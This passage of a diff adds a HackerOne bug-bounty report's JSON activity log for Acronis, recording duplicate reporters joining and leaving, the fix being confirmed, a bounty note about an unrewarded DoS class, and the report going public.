+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/fkuufndebpimyah20hqky9hkaeo1/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "removed_user": {
+                "url": "/kazan71p",
+                "username": "kazan71p"
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8718737,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-23T11:52:44.115Z",
+            "updated_at": "2020-07-23T11:52:44.115Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 938195
+            },
+            "actor": {
+                "username": "jiggis",
+                "cleared": false,
+                "verified": false,
+                "url": "/jiggis",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8722039,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-23T14:03:25.628Z",
+            "updated_at": "2020-07-23T14:03:25.628Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 938653
+            },
+            "actor": {
+                "username": "4mb3rlee",
+                "cleared": false,
+                "verified": false,
+                "url": "/4mb3rlee",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/139/729/91a362274e32f2ad5fe58fec5c519305c7cb4d8e_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8722367,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserRemoved",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-23T14:30:05.188Z",
+            "updated_at": "2020-07-23T14:30:05.188Z",
+            "actor": {
+                "username": "ducnt_",
+                "cleared": false,
+                "verified": false,
+                "url": "/ducnt_",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/6ee5MQXtSjZcRf1dEPRoFEdP/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "removed_user": {
+                "url": "/ducnt_",
+                "username": "ducnt_"
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8724639,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserRemoved",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-23T16:31:05.961Z",
+            "updated_at": "2020-07-23T16:31:05.961Z",
+            "actor": {
+                "username": "itsbing0o",
+                "cleared": false,
+                "verified": false,
+                "url": "/itsbing0o",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/dp9SZrAZqivbBXVxeW2Br65n/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "removed_user": {
+                "url": "/itsbing0o",
+                "username": "itsbing0o"
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8729040,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserRemoved",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-23T20:28:31.834Z",
+            "updated_at": "2020-07-23T20:28:31.834Z",
+            "actor": {
+                "username": "damian89",
+                "cleared": false,
+                "verified": false,
+                "url": "/damian89",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/074/229/2d63a2914887aa483eba2634f50d78b85870d569_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "removed_user": {
+                "url": "/damian89",
+                "username": "damian89"
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8732319,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserRemoved",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-23T23:31:29.106Z",
+            "updated_at": "2020-07-23T23:31:29.106Z",
+            "actor": {
+                "username": "gevakun",
+                "cleared": false,
+                "verified": true,
+                "url": "/gevakun",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/n1zo2c4vcta0j5kkqhdjccoz9suu/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22pexels-christiano-sinisterra-5197132.jpg%22%3B%20filename%2A%3DUTF-8%27%27pexels-christiano-sinisterra-5197132.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2A32MPNM%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070959Z&X-Amz-Expires=1177&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBsEOMwacgmpJyapiLJobGs%2Bgcg9PNH4EriOGZo98SE4AiEAt90x4AmgjAq2rIIH1y%2FzssW%2FAhnA8Qye1rVHIwJcexEquwUImv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBZa1%2FijtCdkdWImhiqPBWGkbtglINv7ypiNIiDYHjrdejYg0wtRl1gT6H0PEyTqGrM6uy7I1J9pNolUh5DffZcgFrPdxwVNxSgsTu4Dj40wjGn2o9qh0BWf4wO5PC%2FYnaaINUtHD0xSUrDCYd16Bo5kaybIxr7xuCItkaUqHeQAu8kGJCQziBsdAr7Ncgc7rh1cBX9EUoKfwpb6OQ0HEPiMYEaf15OVnHiyT1pdUGvbm2Ri8lcoQ7H%2BbeHuFYZkjkH1CR6lUBJfaEhXwMAzp8%2BdinRLj0MTXlU%2F0K1uC7FV4lfRXCvof5wj8m%2BdFNOY%2FthnIrNYj3jQHeMKtCjVez%2FPIpgLd7nMJtBfOKxN%2BA0nuGzrxka0k7Rm3FByYnZe1yMdUDoALpRS1KQuscu5o8jxv0Xa%2BWhozCbPKylMyYNMcIFQm9bmH0GD%2BF%2BIcbbwuskYTIRvRxUYWR%2BgcWc1hXxNXTpVJ1tDlstc4Fw%2BoWtBUiF4MO151WqX1lU6qkcZIB8bIW4LnN1AO%2F3KMQ0cNeVnUjADVXklvgxLHqHVI2%2FxX9F%2Bc7F4jWUlJwMYR4CtnV0lSDOcdsIRAoGm5Dlyu%2BGBHm0E9szzmRe9yTWOQiEbr%2BsaTRhFxzqWr8ue0nEqkZ6ZAmTO1RTlcHTMNZdZS1MPLZdjwthAiae%2FphhQstkxtEKrCfGhMvRS52DKOEvECIcuIeOq8cIkOxFyNXc9ghGN1FFQxpLJKFZmD4hbFCVRZtgrlDVeavSklNmOzLRY1WHQumcB2YvsmGv58jHnm%2FZe51zoKP9U7vpSOyrsjh3OwYQ%2BzuI6rItbcKFQZSLbL4MtcMyHxofT2sx2bl8dQq5UuHZC%2BP1%2Fu3Duhe8K10o7d70jxWXWKkX%2FXCauJlAw7I61pwY6sQG89C08plQG1A6gbdPziJfOcb%2FyZBW3%2BFOpsmNUBJJz3pouKGhoBruTYKmcGNvl6gFBH0kQi6IZr17jMNNb7ofmrjeAKtToIfjLsJlJLkkc7%2FqqGuQ3tX3bnAtE44qHhnRbqFGRQ6BzWEATYPS0L1E%2B6hcCCpz2xmeIirlvlGQbF7UW%2B7O5YFNrzbtwLsHw5D8Y8q%2B15ASZwGa7kp0s8X4M%2FlVGTpWEwtSD6XlV0stRL1o%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a55d38a9fd9e58197b3bc13f250507373c9ff6c0f053af4ffb0c5cde9e2d6d14"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "removed_user": {
+                "url": "/gevakun",
+                "username": "gevakun"
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8736937,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-24T08:22:31.107Z",
+            "updated_at": "2020-07-24T08:22:31.107Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 939272
+            },
+            "actor": {
+                "username": "cabelo",
+                "cleared": false,
+                "verified": false,
+                "url": "/cabelo",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/rlpilkpvkyndcu2hqf334uw2ka7y/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8736946,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-24T08:23:17.360Z",
+            "updated_at": "2020-07-24T08:23:17.360Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 940255
+            },
+            "actor": {
+                "username": "ifrahiman",
+                "cleared": false,
+                "verified": true,
+                "url": "/ifrahiman",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/7i19zj1mg7dz4ju0m90duvl76dzg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8739933,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-24T11:06:06.973Z",
+            "updated_at": "2020-07-24T11:06:06.973Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 941093
+            },
+            "actor": {
+                "username": "patient_zero",
+                "cleared": false,
+                "verified": false,
+                "url": "/patient_zero",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/07hq1muizxh23myf2o8nmfwlv23y/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8739970,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "🤣🤣🤣🤣",
+            "automated_response": false,
+            "created_at": "2020-07-24T11:08:59.590Z",
+            "updated_at": "2020-07-24T11:08:59.590Z",
+            "actor": {
+                "username": "4mb3rlee",
+                "cleared": false,
+                "verified": false,
+                "url": "/4mb3rlee",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/139/729/91a362274e32f2ad5fe58fec5c519305c7cb4d8e_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8741152,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-24T12:22:09.004Z",
+            "updated_at": "2020-07-24T12:22:09.004Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 941114
+            },
+            "actor": {
+                "username": "anishacks",
+                "cleared": false,
+                "verified": false,
+                "url": "/anishacks",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/nhnij9we2a4nj3ovdvt4etptlj28/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8745498,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-24T16:48:48.117Z",
+            "updated_at": "2020-07-24T16:48:48.117Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 941372
+            },
+            "actor": {
+                "username": "agametov",
+                "cleared": false,
+                "verified": false,
+                "url": "/agametov",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/076/360/3551febe6823b9ab9b7789b224207889414ef470_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8746562,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserRemoved",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-24T18:56:11.504Z",
+            "updated_at": "2020-07-24T18:56:11.504Z",
+            "actor": {
+                "username": "agametov",
+                "cleared": false,
+                "verified": false,
+                "url": "/agametov",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/076/360/3551febe6823b9ab9b7789b224207889414ef470_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "removed_user": {
+                "url": "/agametov",
+                "username": "agametov"
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8747869,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-24T21:18:29.012Z",
+            "updated_at": "2020-07-24T21:18:29.012Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 941677
+            },
+            "actor": {
+                "username": "h2x0",
+                "cleared": false,
+                "verified": false,
+                "url": "/h2x0",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/5CCGwTDrZMDrHdinnq6e6CsG/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8752693,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserRemoved",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-25T15:46:41.022Z",
+            "updated_at": "2020-07-25T15:46:41.022Z",
+            "actor": {
+                "username": "geekboy",
+                "cleared": false,
+                "verified": false,
+                "url": "/geekboy",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/547/b8825b0ae39f962fbe7813bf40d4efe19d018ee9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "removed_user": {
+                "url": "/geekboy",
+                "username": "geekboy"
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8755873,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserRemoved",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-26T08:33:56.345Z",
+            "updated_at": "2020-07-26T08:33:56.345Z",
+            "actor": {
+                "username": "patient_zero",
+                "cleared": false,
+                "verified": false,
+                "url": "/patient_zero",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/07hq1muizxh23myf2o8nmfwlv23y/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "removed_user": {
+                "url": "/patient_zero",
+                "username": "patient_zero"
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8759591,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserRemoved",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-26T23:59:39.039Z",
+            "updated_at": "2020-07-26T23:59:39.039Z",
+            "actor": {
+                "username": "cabelo",
+                "cleared": false,
+                "verified": false,
+                "url": "/cabelo",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/rlpilkpvkyndcu2hqf334uw2ka7y/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "removed_user": {
+                "url": "/cabelo",
+                "username": "cabelo"
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8762454,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-27T08:57:58.578Z",
+            "updated_at": "2020-07-27T08:57:58.578Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 942313
+            },
+            "actor": {
+                "username": "ahmed_benzima",
+                "cleared": false,
+                "verified": false,
+                "url": "/ahmed_benzima",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8762461,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-27T08:58:31.720Z",
+            "updated_at": "2020-07-27T08:58:31.720Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 942064
+            },
+            "actor": {
+                "username": "mrmj777",
+                "cleared": false,
+                "verified": false,
+                "url": "/mrmj777",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/ckULub3qbgmRoKp56nVxdMpc/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8762467,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-27T08:59:05.562Z",
+            "updated_at": "2020-07-27T08:59:05.562Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 942612
+            },
+            "actor": {
+                "username": "l1nkworld",
+                "cleared": false,
+                "verified": false,
+                "url": "/l1nkworld",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/wJZjNYf89j799BNbqdwRV3nR/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8762588,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserRemoved",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-27T09:09:48.923Z",
+            "updated_at": "2020-07-27T09:09:48.923Z",
+            "actor": {
+                "username": "4mb3rlee",
+                "cleared": false,
+                "verified": false,
+                "url": "/4mb3rlee",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/139/729/91a362274e32f2ad5fe58fec5c519305c7cb4d8e_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "removed_user": {
+                "url": "/4mb3rlee",
+                "username": "4mb3rlee"
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8763636,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugResolved",
+            "message": "Thanks for catching this bug!\n\nWe have fixed it, please confirm that you are no longer able to reproduce the issue.\n",
+            "automated_response": true,
+            "created_at": "2020-07-27T11:01:06.125Z",
+            "updated_at": "2020-07-27T11:01:06.125Z",
+            "actor": {
+                "username": "acronis-bot",
+                "cleared": false,
+                "verified": false,
+                "url": "/acronis-bot",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "reporter": {
+                "username": "10nf",
+                "url": "/10nf"
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8764613,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I can confirm that the fix is good and I'm not able to reproduce it again.\n",
+            "automated_response": false,
+            "created_at": "2020-07-27T12:28:21.732Z",
+            "updated_at": "2020-07-27T12:28:21.732Z",
+            "actor": {
+                "username": "10nf",
+                "cleared": false,
+                "verified": true,
+                "url": "/10nf",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/J1tXDaUQ2vAnWyACoRJzaQ9D/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8776447,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BountyAwarded",
+            "message": "Thanks for participating in our Bug Bounty program!\nBy our policy we're not awarding for DoS issues and there is no sensitive data that was disclosed (we think you found exactly same disclosed files in the wild while hunting). We made a decision to award for this report since we found another issues during our internal investigation.\n\nBounty is transferred to your account.\nHappy bug hunting and we're waiting for more reports from you!",
+            "automated_response": false,
+            "created_at": "2020-07-28T09:55:30.970Z",
+            "updated_at": "2020-07-28T09:55:30.970Z",
+            "actor": {
+                "url": "/acronis",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/e54TDdWdgLKsH3h1oFpK26bq/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "profile": {
+                    "name": "Acronis"
+                }
+            },
+            "bounty_currency": "usd",
+            "genius_execution_id": null,
+            "team_handle": "acronis",
+            "collaborator": {
+                "username": "10nf",
+                "url": "/10nf"
+            }
+        },
+        {
+            "id": 8789926,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Thanks for the bounty! , it's a pleasure to report bugs to Acronis and making it more secure.",
+            "automated_response": false,
+            "created_at": "2020-07-29T09:10:06.385Z",
+            "updated_at": "2020-07-29T09:10:06.385Z",
+            "actor": {
+                "username": "10nf",
+                "cleared": false,
+                "verified": true,
+                "url": "/10nf",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/J1tXDaUQ2vAnWyACoRJzaQ9D/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 9260945,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserRemoved",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-09-18T18:44:44.181Z",
+            "updated_at": "2020-09-18T18:44:44.181Z",
+            "actor": {
+                "username": "jiggis",
+                "cleared": false,
+                "verified": false,
+                "url": "/jiggis",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "removed_user": {
+                "url": "/jiggis",
+                "username": "jiggis"
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 12201524,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-06-22T06:38:09.821Z",
+            "updated_at": "2021-06-22T06:38:09.821Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "stushieva",
+                "cleared": false,
+                "verified": false,
+                "url": "/stushieva",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/j7zANdAVudZqo6vWUahsdFKG/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 12207934,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-06-22T14:47:39.175Z",
+            "updated_at": "2021-06-22T14:47:39.175Z",
+            "actor": {
+                "username": "10nf",
+                "cleared": false,
+                "verified": true,
+                "url": "/10nf",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/J1tXDaUQ2vAnWyACoRJzaQ9D/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 12207935,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-06-22T14:47:39.285Z",
+            "updated_at": "2021-06-22T14:47:39.285Z",
+            "actor": {
+                "username": "10nf",
+                "cleared": false,
+                "verified": true,
+                "url": "/10nf",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/J1tXDaUQ2vAnWyACoRJzaQ9D/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
